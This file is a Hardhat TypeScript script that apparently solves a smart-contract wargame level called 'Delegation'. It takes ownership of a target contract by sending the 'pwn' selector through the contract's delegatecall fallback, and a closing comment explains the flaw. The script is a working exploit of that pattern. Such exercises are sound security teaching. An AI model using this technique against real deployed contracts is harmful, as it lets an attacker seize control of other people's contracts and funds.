import { Contract } from "ethers";
import { ethers } from "hardhat";
import { abi } from "../../artifacts/contracts/6.Delegation/Delegate.sol/Delegate.json";
import { displayResult } from "../../utils/displayResult";

const targetAddress = "0xF121Fdf903C0001793e53f0B014405C00Bc2A1b8";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);

  const it = new ethers.utils.Interface(abi);
  const newTx = {
    data: it.getSighash("pwn"),
    to: target.address,
    gasLimit: "3000000",
  };
  const tx = await attacker.sendTransaction(newTx);
  await tx.wait();
  const owner = await target.connect(attacker).owner();
  displayResult(owner === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation :
Delegation because of its fallback function + delegatecall will call any function 
inside the contract Delegate.sol in Delegation environnement. So we can call the function pwn() which will
change the owner of the contract to the attacker address.
*/
